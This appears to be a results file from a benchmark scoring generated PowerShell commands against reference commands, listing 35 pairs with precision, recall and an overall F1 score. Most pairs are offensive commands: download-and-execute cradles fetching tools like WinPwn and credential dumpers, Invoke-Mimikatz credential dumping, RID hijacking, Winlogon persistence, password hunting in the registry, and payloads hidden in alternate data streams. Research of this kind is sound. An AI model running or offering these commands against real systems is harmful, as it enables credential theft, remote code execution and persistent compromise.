@@ -1,0 +1,354 @@
+dfs extracted :  35 35
+1
+command1: Invoke-PhishingAttack -Type Credential
+command2: Invoke-CredentialPhisher
+
+ precision: 0.98 recall: 0.2 
+common entries: 42 
+target entries: 43 
+ground truth entries: 206
+
+
+2
+command1: IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/fleschutz/PowerShell/main/scripts/check-admin.ps1").Content
+command2: Invoke-Expression -Command "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fleschutz/PowerShell/main/scripts/check-admin.ps1')"
+
+ precision: 0.8 recall: 0.92 
+common entries: 60 
+target entries: 75 
+ground truth entries: 65
+
+
+3
+command1: IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1").Content
+command2: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')
+
+ precision: 0.85 recall: 0.91 
+common entries: 60 
+target entries: 71 
+ground truth entries: 66
+
+
+4
+command1: Invoke-Command -ScriptBlock { & "https://raw.githubusercontent.com/fleschutz/PowerShell/main/scripts/check-admin.ps1" }
+command2: $Invoke = {IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fleschutz/PowerShell/main/scripts/check-admin.ps1')}; Invoke-Command -ScriptBlock $Invoke
+
+ precision: 0.98 recall: 0.64 
+common entries: 43 
+target entries: 44 
+ground truth entries: 67
+
+
+5
+command1: Invoke-Mimikatz -Command "privilege::debug exit" -Force
+command2: powershell -exec bypass -command "Invoke-Mimikatz -DumpCreds"
+
+ precision: 0.83 recall: 0.86 
+common entries: 89 
+target entries: 107 
+ground truth entries: 103
+
+
+6
+command1: Get-CimInstance -Class Win32_ComputerSystem | Export-Csv -Path "C:\results.csv" -NoTypeInformation
+command2: powershell.exe -c "Get-CimInstance -class win32_operatingsystem | select -property * | export-csv msdebug.log"
+
+ precision: 0.92 recall: 0.36 
+common entries: 36 
+target entries: 39 
+ground truth entries: 99
+
+
+7
+command1: powershell.exe -WindowStyle Hidden -Command "& { IEX (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1').Content }"
+command2: powershell -ep bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1');"
+
+ precision: 0.82 recall: 0.93 
+common entries: 108 
+target entries: 132 
+ground truth entries: 116
+
+
+8
+command1: Invoke-RIDHijacking -Username "unina" -RID 500
+command2: Invoke-RIDHijacking -User unina -RID 500
+
+ precision: 0.96 recall: 0.94 
+common entries: 108 
+target entries: 112 
+ground truth entries: 115
+
+
+9
+command1: Invoke-Mimikatz -Command "privilege::debug exit" -Force -Bypass
+command2: powershell -ep bypass -c "Invoke-Mimikatz"
+
+ precision: 0.83 recall: 0.68 
+common entries: 90 
+target entries: 108 
+ground truth entries: 132
+
+
+10
+command1: IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/fleschutz/PowerShell/main/scripts/check-admin.ps1").Content
+command2: IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
+
+ precision: 0.82 recall: 0.93 
+common entries: 62 
+target entries: 76 
+ground truth entries: 67
+
+
+11
+command1: powershell.exe -ExecutionPolicy Bypass -Command "& { IEX (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/WINspect.ps1').Content }"
+command2: powershell.exe -exec bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/WINspect.ps1')"
+
+ precision: 0.85 recall: 0.76 
+common entries: 121 
+target entries: 142 
+ground truth entries: 160
+
+
+12
+command1: Get-BrowserInfo -Username "YourUsername" -SearchTerm "YourSearchTerm"
+command2: Get-BrowserInformation -Browser All -Datatype History -UserName Luca -Search 'wikipedia'
+
+ precision: 0.87 recall: 0.39 
+common entries: 45 
+target entries: 52 
+ground truth entries: 114
+
+
+13
+command1: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& { IEX (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/fleschutz/PowerShell/main/scripts/check-admin.ps1').Content }"
+command2: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fleschutz/PowerShell/main/scripts/check-admin.ps1')}
+
+ precision: 0.8 recall: 0.94 
+common entries: 102 
+target entries: 127 
+ground truth entries: 109
+
+
+14
+command1: Get-CimInstance -Class Win32_Group
+command2: Get-CimInstance Win32_Group
+
+ precision: 0.96 recall: 0.89 
+common entries: 54 
+target entries: 56 
+ground truth entries: 61
+
+
+15
+command1: Get-Date -Format "YourDateFormat"
+command2: Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'
+
+ precision: 1.0 recall: 0.81 
+common entries: 42 
+target entries: 42 
+ground truth entries: 52
+
+
+16
+command1: $mimikatzCommand = [System.Text.Encoding]::Unicode.GetBytes("Invoke-Mimikatz -DumpCreds"); [System.Convert]::ToBase64String($mimikatzCommand)
+command2: $payload = [System.Text.Encoding]::Unicode.GetBytes("Invoke-Mimikatz")
+
+ precision: 0.96 recall: 0.9 
+common entries: 45 
+target entries: 47 
+ground truth entries: 50
+
+
+17
+command1: Invoke-Mimikatz -Command "privilege::debug exit" -Force -Bypass
+command2: powershell.exe -exec bypass -c "Invoke-Mimikatz"
+
+ precision: 0.84 recall: 0.88 
+common entries: 93 
+target entries: 111 
+ground truth entries: 106
+
+
+18
+command1: Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/credential.ps1').Content
+command2: $payload = 'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/credential.ps1")'; Invoke-Expression $payload
+
+ precision: 0.91 recall: 0.92 
+common entries: 73 
+target entries: 80 
+ground truth entries: 79
+
+
+19
+command1: Get-CimInstance -Class Win32_UserAccount
+command2: Get-CimInstance -Class Win32_UserAccount
+
+ precision: 0.96 recall: 0.71 
+common entries: 45 
+target entries: 47 
+ground truth entries: 63
+
+
+20
+command1: Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Whitecat18/Powershell-Scripts-for-Hackers-and-Pentesters/main/scripts/all_in_one_enum.ps1' -OutFile 'C:\Path\To\Script.ps1'; Invoke-Expression 'C:\Path\To\Script.ps1'
+command2: powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "IEX (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Whitecat18/Powershell-Scripts-for-Hackers-and-Pentesters/main/scripts/all_in_one_enum.ps1').Content"
+
+ precision: 0.97 recall: 0.39 
+common entries: 74 
+target entries: 76 
+ground truth entries: 188
+
+
+21
+command1: Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Winlogon' -Name 'PropertyName' -Value 'PropertyValue'
+command2: Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, ${binaryToExec}" -Force
+
+ precision: 1.0 recall: 0.89 
+common entries: 49 
+target entries: 49 
+ground truth entries: 55
+
+
+22
+command1: Get-ChildItem -Path .
+command2: dir
+
+ precision: 0.96 recall: 0.9 
+common entries: 47 
+target entries: 49 
+ground truth entries: 52
+
+
+23
+command1: Get-Item -Path 'HKCR:\','HKCU:\','HKLM:\','HKU:\','HKCC:\' -Recurse | Where-Object { $_.Name -like '*password*' -or $_.Value -like '*password*' }
+command2: $pattern = "password";$hives = "HKEY_CURRENT_USER","HKEY_LOCAL_MACHINE","HKEY_USERS","HKEY_CURRENT_CONFIG";foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | sls "$pattern" };
+
+ precision: 1.0 recall: 0.57 
+common entries: 49 
+target entries: 49 
+ground truth entries: 86
+
+
+24
+command1: . .\Get-PassHashes.ps1; Get-PassHashes -CommandType All
+command2: iex(iwr("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1"));Get-PassHashes
+
+ precision: 1.0 recall: 0.61 
+common entries: 54 
+target entries: 54 
+ground truth entries: 88
+
+
+25
+command1: Get-GPO -Domain 'DomainName' -OrganizationalUnit 'OUPath'
+command2: Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'
+
+ precision: 1.0 recall: 0.36 
+common entries: 54 
+target entries: 54 
+ground truth entries: 151
+
+
+26
+command1: netsh interface portproxy add v4tov4 listenport=5446 listenaddress=5985 connectport=5985 connectaddress=10.35.8.23
+command2: netsh interface portproxy add v4tov4 listenport=5446 listenaddress=10.35.8.17 connectport=5985 connectaddress=10.35.8.23
+
+ precision: 0.98 recall: 0.95 
+common entries: 129 
+target entries: 131 
+ground truth entries: 136
+
+
+27
+command1: Get-ChildItem -Path 'C:\Path\To\ConfigFiles\' -Recurse | Select-String -Pattern 'password'
+command2: gci C:\Users\unina\Desktop -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"
+
+ precision: 1.0 recall: 0.91 
+common entries: 49 
+target entries: 49 
+ground truth entries: 54
+
+
+28
+command1: 1..254 | ForEach-Object { [System.Net.Dns]::GetHostEntry('10.10.1.' + $_) } | Out-File 'ip_hostname.txt'
+command2: $net = "10.10.1.";0..255 | foreach {$r=(Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders | Out-String).trim().replace("\s+","").replace("`r","").replace("`n"," "); Write-Output "$net$_ $r"} | tee ip_hostname.txt
+
+ precision: 1.0 recall: 0.61 
+common entries: 56 
+target entries: 56 
+ground truth entries: 92
+
+
+29
+command1: New-SmbShare -Name 'GuestShare' -Path 'C:\Path\To\SharedFolder' -ReadAccess 'Everyone'
+command2: new-item "c:\users\public\share" -itemtype directory;New-SmbShare -Name "sharedir" -Path "C:\users\public\share" -FullAccess "Everyone","Guests","Anonymous Logon"
+
+ precision: 1.0 recall: 0.9 
+common entries: 66 
+target entries: 66 
+ground truth entries: 73
+
+
+30
+command1: Add-Content -Path 'C:\Path\To\File.txt' -Value 'MaliciousData' -Stream '::$DATA'
+command2: $content = 'Invoke-Mimikatz'; $file = 'C:\normal.txt'; $stream = 'C:\normal.txt:hidden'; Set-Content -Path $file -Value 'This is a normal file'; Add-Content -Path $stream -Value $content; Get-Content -Path $stream
+
+ precision: 1.0 recall: 0.84 
+common entries: 49 
+target entries: 49 
+ground truth entries: 58
+
+
+31
+command1: whoami /user
+command2: ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
+
+ precision: 1.0 recall: 0.81 
+common entries: 44 
+target entries: 44 
+ground truth entries: 54
+
+
+32
+command1: [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Base64EncodedPath'))
+command2: $path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVGVtcFxBZG1pblRvb2xz')); Invoke-Item $path
+
+ precision: 1.0 recall: 0.91 
+common entries: 49 
+target entries: 49 
+ground truth entries: 54
+
+
+33
+command1: Get-ADForest
+command2: Get-ForestGlobalCatalog
+
+ precision: 0.98 recall: 0.35 
+common entries: 53 
+target entries: 54 
+ground truth entries: 151
+
+
+34
+command1: Add-Type @" public class MaliciousCode { public static void Execute() { // Malicious code goes here } } "@; [MaliciousCode]::Execute()
+command2: Add-Type -TypeDefinition 'using System; public class MyClass { public static void Run() { Console.WriteLine("Executed"); } }'; [MyClass]::Run()
+
+ precision: 0.96 recall: 0.6 
+common entries: 52 
+target entries: 54 
+ground truth entries: 86
+
+
+35
+command1: New-NetFirewallRule -DisplayName 'Allow RDP' -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow
+command2: Get-NetFirewallRule -DisplayGroup "Remote Desktop" | Set-NetFirewallRule -Enabled True
+
+ precision: 0.94 recall: 0.9 
+common entries: 63 
+target entries: 67 
+ground truth entries: 70
+
+
+overall precision: 0.93514 overall recall: 0.74486
+overall f1 score: 0.82922
+
